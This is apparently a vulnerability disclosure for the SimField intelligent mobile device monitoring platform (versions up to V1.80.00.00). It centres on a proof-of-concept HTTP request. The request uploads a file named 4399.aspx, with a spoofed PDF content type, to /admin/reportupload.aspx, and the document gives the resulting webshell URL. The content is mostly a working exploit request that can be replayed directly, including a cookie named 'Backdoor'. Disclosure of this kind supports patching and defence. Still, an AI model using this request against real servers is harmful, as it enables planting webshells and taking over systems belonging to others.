The SimField intelligent mobile device monitoring platform has file upload vulnerabilities

official website:http://www.supcontech.com/

version:<=V1.80.00.00

![WPS图片(1)](https://github.com/RCEraser/cve/assets/131632691/ad67533d-9543-4d50-a52e-913857c9ef5a)

POC
```
POST /admin/reportupload.aspx HTTP/1.1
Host: ip:port
Content-Length: 965
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://192.168.0.108:8099
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.81 Safari/537.36 SE 2.X MetaSr 1.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygMJy3oA2nbIWLN7e
Referer: http://192.168.0.108:8099/admin/reportupload.aspx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ASP.NET_SessionId=3c11jcv3fpsoqzwm5rbktlbi; Backdoor=bdbca288fee7f92f2bfa9f7012727740
Connection: close

------WebKitFormBoundarygMJy3oA2nbIWLN7e
Content-Disposition: form-data; name="__VIEWSTATE"

/wEPDwUKLTkyNDAzMDA2Mw9kFgJmD2QWAgIDD2QWAgIBD2QWAgICD2QWAmYPEA8WAh4LXyFEYXRhQm91bmRnZBAVAgnmoLnnm67lvZULwqDCoHwtLTExMTEVAgANL3JlcG9ydC8xMTExLxQrAwJnZ2RkZAf5ferL0OMHx8KFnVEBsJGMeM+8OpV752Us7n/IJjM4
------WebKitFormBoundarygMJy3oA2nbIWLN7e
Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"

02032438
------WebKitFormBoundarygMJy3oA2nbIWLN7e
Content-Disposition: form-data; name="__EVENTVALIDATION"

/wEdAAN/aR1SfvbwoYh6ymN0iwIEa4ehUoCH7o2D6J9YvCyvuyc31agJLrjRVglBIb9oFHZP6yU++K93dpdYNAUs8a3CrZiDfqAY/Wt+ByKN8nJNeA==
------WebKitFormBoundarygMJy3oA2nbIWLN7e
Content-Disposition: form-data; name="ctl00$ContentBodyHolder$selFolder$selFolderStruct"


------WebKitFormBoundarygMJy3oA2nbIWLN7e
Content-Disposition: form-data; name="files[]"; filename="4399.aspx"
Content-Type: application/pdf

just test
------WebKitFormBoundarygMJy3oA2nbIWLN7e--
```
Webshell site ： 
http://192.168.0.108:8099/report/4399.aspx

![WPS图片(2)](https://github.com/RCEraser/cve/assets/131632691/26bcb27c-a353-4a1b-902b-4aca21fb8364)

![WPS图片(3)](https://github.com/RCEraser/cve/assets/131632691/f1e500ce-c9d8-4b0f-98a5-a917514823af)

![WPS图片(4)](https://github.com/RCEraser/cve/assets/131632691/d49e7563-091c-48c8-a6a9-a24a4439759e)

